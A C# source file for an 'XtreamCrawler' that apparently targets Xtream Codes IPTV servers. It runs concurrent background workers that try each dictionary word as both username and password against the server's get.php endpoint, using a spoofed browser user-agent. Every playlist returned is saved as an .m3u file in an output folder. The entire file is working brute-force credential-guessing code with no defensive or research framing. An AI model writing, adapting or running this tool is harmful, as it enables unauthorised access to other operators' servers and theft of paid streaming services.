using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.ComponentModel;
using System.IO;

namespace IPTV_Sharp
{

    public enum CrawlerStatus
    {
        Idle,
        Working,
        InvalidSite,
        CompletedWithResults,
        CompletedWithoutResults,
        Aborted
    }

    public class CrawlTaskData
    {
        public bool completed;
        public string result;
        public BackgroundWorker task;

        public CrawlTaskData()
        {
            completed = false;
            result = string.Empty;
            task = new BackgroundWorker();
        }
    }

    public class XtreamCrawler
    {
        private DictionaryManager dictionary;
        private WebClient client;
        private string server;
        private int concurrent_tasks;

        public int progress;
        public CrawlerStatus status;
        public int num_results=0;

        CrawlTaskData[] crawl_tasks;
        bool force_crawl;
        bool uppercase;

        public XtreamCrawler(DictionaryManager dictionary, string server, int concurrent_tasks, bool force_crawl, bool uppercase)
        {
            this.dictionary = dictionary;
            this.server = server;
            client = new WebClient();
            status = CrawlerStatus.Idle;
            this.concurrent_tasks = concurrent_tasks;
            this.force_crawl = force_crawl;
            this.uppercase = uppercase;
        }


        public void DoCrawl(object sender, DoWorkEventArgs e)
        {
            status = CrawlerStatus.Working;
            Crawl_Manager();
        }



        private void Crawl_Manager()
        {
            string output_result = string.Empty;
            bool found_result = false;
            progress = 0;
            num_results = 0;
            try
            {
                bool valid_site;
                if(force_crawl)
                {
                    valid_site = true;
                }
                else
                {
                    string page = client.DownloadString(server.Trim());
                    valid_site = page != "" && page.Contains("Xtream Codes");
                }
                


                if (valid_site && dictionary.entries.Count > 0)
                {                  

                    while (progress < dictionary.entries.Count)
                    {
                        int increment;
                        if ((progress + concurrent_tasks) < dictionary.entries.Count)
                        {
                            increment = concurrent_tasks;
                        }
                        else
                        {
                            increment = dictionary.entries.Count - progress;
                        }

                        crawl_tasks = new CrawlTaskData[increment];

                        for (int j = 0; j < crawl_tasks.Length; j++)
                        {
                            int x = progress + j;

                            string search_string;
                            if(uppercase)
                            {
                                search_string = dictionary.entries[x];
                            }
                            else
                            {
                                search_string = char.ToUpper(dictionary.entries[x][0]) + dictionary.entries[x].Substring(1);
                            }               
                            crawl_tasks[j] = new CrawlTaskData();
                            crawl_tasks[j].task.WorkerSupportsCancellation = true;
                            crawl_tasks[j].task.WorkerReportsProgress = true;
                            crawl_tasks[j].task.DoWork += new DoWorkEventHandler(Crawl_Method);
                            var arguments = Tuple.Create<string, int>(search_string, j);
                            crawl_tasks[j].task.RunWorkerAsync(arguments);

                        }

                        WaitWorkers();                      

                        foreach (CrawlTaskData crawl_task in crawl_tasks)
                        {
                            if (crawl_task.result != string.Empty)
                            {
                                output_result = crawl_task.result;
                                found_result = true;
                                num_results++;
                                if (!Directory.Exists("output")) Directory.CreateDirectory("output");
                                string output = "output/tv_channels_" + num_results + ".m3u";
                                StreamWriter outputFile = new StreamWriter(output, true);
                                outputFile.WriteLine(output_result);
                                outputFile.Flush();
                                outputFile.Close();
                                outputFile.Dispose();
                            }
                        }

                        progress += increment;
                    }
                    
                    if(found_result)
                    {
                        status = CrawlerStatus.CompletedWithResults;    
                    }
                    else
                    {
                        status = CrawlerStatus.CompletedWithoutResults;
                    }
                }
                else
                {
                    status = CrawlerStatus.InvalidSite;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                status = CrawlerStatus.InvalidSite;
            }
        }


        private void WaitWorkers()
        {
            bool done;
            do
            {
                done = true;
                for (int i = 0; i < crawl_tasks.Length; i++)
                {
                    done = done && crawl_tasks[i].completed;
                }
            } while (!done);
        }

        private void Crawl_Method(object sender, DoWorkEventArgs e)
        {
            Tuple<string, int> arguments = e.Argument as Tuple<string, int>;
            
            string search_string = arguments.Item1;
            int index = arguments.Item2;

            try
            {
                string url = server.Trim() + "/get.php?username=" + search_string + "&password=" + search_string + "&type=m3u&output=mpegts";
                WebClient client = new WebClient();
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                crawl_tasks[index].result = client.DownloadString(url);
            }
            catch(WebException ex)
            {
                Console.WriteLine(ex.Message);
            }

            crawl_tasks[index].completed = true;
        }

    }
}
